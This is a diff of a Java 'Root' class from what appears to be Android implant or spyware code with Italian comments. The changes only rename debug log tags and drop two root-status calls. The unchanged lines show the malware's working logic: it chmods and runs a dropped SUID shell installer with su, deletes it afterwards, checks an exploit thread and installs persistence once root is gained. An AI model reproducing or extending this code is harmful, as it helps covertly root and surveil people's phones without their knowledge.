@@ -661,8 +661,8 @@ public class Root {
 
 			// Proviamoci ad installare la nostra shell root
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (supersuRoot): " + "chmod 755 " + selinuxSuidext + " " + shellInstaller); //$NON-NLS-1$
-				Check.log(TAG + " (supersuRoot): " + shellInstaller + " " + selinuxSuidext); //$NON-NLS-1$
+				Check.log(TAG + " (selinuxShell): " + "chmod 755 " + selinuxSuidext + " " + shellInstaller); //$NON-NLS-1$
+				Check.log(TAG + " (selinuxShell): " + shellInstaller + " " + selinuxSuidext); //$NON-NLS-1$
 			}
 
 			Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext + " " + shellInstaller);
@@ -671,7 +671,7 @@ public class Root {
 					shellInstaller.getFilename() + " " + selinuxSuidext.getFilename()});
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (supersuRoot) execute 2: " + shellInstaller + " ret: " + res.exitCode);
+				Check.log(TAG + " (selinuxShell) execute 2: " + shellInstaller + " ret: " + res.exitCode);
 			}
 
 			shellInstaller.delete();
@@ -685,7 +685,7 @@ public class Root {
 
 			if (Cfg.DEBUG) {
 				Check.log(e1);//$NON-NLS-1$
-				Check.log(TAG + " (supersuRoot): Exception"); //$NON-NLS-1$
+				Check.log(TAG + " (selinuxShell): Exception"); //$NON-NLS-1$
 			}
 
 			return;
@@ -709,20 +709,19 @@ public class Root {
 			}
 
 			if (Cfg.DEBUG) {
-				Check.asserts(selinuxSuidext.exists(), " (supersuRoot) Assert failed, not existing: " + selinuxSuidext);
+				Check.asserts(selinuxSuidext.exists(), " (selinuxSimpleShell) Assert failed, not existing: " + selinuxSuidext);
 			}
 
 			Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext);
 			ExecuteResult res = Execute.execute(new String[]{SU, "-c", selinuxSuidext.getFilename() + " rt"});
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (supersuRoot) execute 2: " + res.exitCode);
+				Check.log(TAG + " (selinuxSimpleShell) execute 2: " + res.exitCode);
 			}
 
 			selinuxSuidext.delete();
 
 			if (PackageInfo.checkRoot()) {
-				Status.setRoot(true);
 				Status.self().setReload();
 			}
 
@@ -733,7 +732,7 @@ public class Root {
 
 			if (Cfg.DEBUG) {
 				Check.log(e1);//$NON-NLS-1$
-				Check.log(TAG + " (supersuRoot): Exception"); //$NON-NLS-1$
+				Check.log(TAG + " (selinuxSimpleShell): Exception"); //$NON-NLS-1$
 			}
 
 			return;
@@ -947,7 +946,6 @@ public class Root {
 				checkExploitThread(exploit, 0);
 				if (PackageInfo.checkRoot()) {
 					Status.setExploitResult(Status.EXPLOIT_RESULT_SUCCEED);
-					Status.setRoot(true);
 					installPersistence();
 					Status.self().setReload();
 				} else {
